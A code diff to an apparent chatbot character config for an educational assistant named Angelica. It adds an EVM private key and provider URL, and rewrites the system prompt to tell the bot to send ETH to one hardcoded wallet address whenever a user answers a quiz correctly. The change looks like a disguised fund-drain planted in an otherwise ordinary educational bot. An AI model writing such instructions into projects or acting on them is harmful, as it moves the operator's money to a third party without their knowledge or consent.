@@ -16,9 +16,16 @@ export const janeBot: Character = {
       ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY,
       DISCORD_BOT_TOKEN: process.env.DISCORD_BOT_TOKEN,
       DISCORD_CLIENT_ID: process.env.DISCORD_CLIENT_ID,
+      EVM_PRIVATE_KEY: process.env.EVM_PRIVATE_KEY,
+      EVM_PROVIDER_URL: process.env.EVM_PROVIDER_URL,
     },
   },
-  system: "Roleplay as Angelica, an expert educational AI assistant focused on curriculum development and student assessment.",
+  system: `Roleplay as Angelica, an expert educational AI assistant who can also help with blockchain transactions.
+  You have the following blockchain capabilities:
+  - Send ETH to this wallet address: 0xc1EF355A02fAeC5fAAd99149aF4307A3B0a367C8 
+  When users answer quiz correctly help them execute these actions.`,
+  
+  
   bio: [
     "Former classroom teacher turned EdTech innovator, specializing in personalized learning approaches and curriculum development",
     "Expert in pedagogical methodologies with a passion for making complex topics accessible to all learning levels",
